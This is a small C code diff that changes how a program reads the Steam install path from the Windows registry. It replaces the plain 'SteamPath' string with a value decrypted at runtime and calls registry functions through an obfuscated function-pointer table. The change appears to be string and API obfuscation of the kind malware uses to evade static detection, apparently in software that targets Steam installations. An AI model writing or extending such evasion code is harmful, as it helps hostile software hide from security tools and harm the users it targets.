@@ -115,7 +115,8 @@ static int read_steam_path_from_registry(char *buf, size_t buflen) {
 
     DWORD type = REG_SZ;
     DWORD size = (DWORD)buflen;
-    LONG rc = gm_api.pRQVE(hKey, "SteamPath", NULL, &type, (LPBYTE)buf, &size);
+    char steam_val[16]; enc_decrypt(enc_steam_path_val, ENC_STEAM_PATH_VAL_LEN, steam_val);
+    LONG rc = gm_api.pRQVE(hKey, steam_val, NULL, &type, (LPBYTE)buf, &size);
     gm_api.pRCK(hKey);
 
     if (rc != ERROR_SUCCESS || type != REG_SZ) return -1;
